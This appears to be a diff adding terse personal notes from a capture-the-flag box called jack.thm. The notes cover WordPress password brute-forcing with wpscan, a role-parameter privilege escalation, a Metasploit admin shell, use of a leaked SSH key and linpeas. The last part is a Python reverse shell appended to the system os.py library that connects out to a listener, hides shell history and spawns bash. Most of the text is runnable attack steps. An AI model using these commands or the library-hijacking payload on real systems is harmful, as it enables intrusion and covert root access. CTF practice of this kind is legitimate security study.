@@ -1,0 +1,54 @@
+noticed admin page makes you go to a url
+set /etc/hosts:
+10.10.159.86 jack.thm
+
+
+wpscan --url http://jack.thm/ -t 3 -P /usr/share/wordlists/fasttrack.txt -U users.txt
+
+adding &ure_other_roles=administrator to give you admin privs:
+https://windsorwebdeveloper.com/dc-6-vulnhub-walkthrough/
+
+after using wordpress admin shell metasploit, found I had to log out, log back in, confirm email, then run exploit
+
+upgrade shell after meterpreter wordpress admin shell:
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+just pecking around, saw a note in reminder.txt in jack's home dir to stop doing bad backups.
+
+looked in /var/backups and saw id_rsa, time to ssh!
+
+use linpeas
+https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+
+good reading (and php shell plugin edit)
+https://windsorwebdeveloper.com/web-developer-1-vulnhub-walkthrough/
+
+I was able to write to:
+/usr/lib/python2.7/os.py
+
+So, set up listener on local host:
+nc -nlvp 4444
+
+created text.py:
+import os
+import pty
+import socket
+ZIP_DEFLATED=0
+class ZipFile:
+    def close(*args):return
+    def write(*args): return
+    def __init__(self, *args):return
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(('10.13.1.70',4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+os.putenv('HISTFILE','/dev/null')
+pty.spawn('/bin/bash')
+s.close()
+
+cat text.py >> /usr/lib/python2.7/os.py
+
+
+Then I waited... actually logging in once might have helped, but waiting seemed to work.
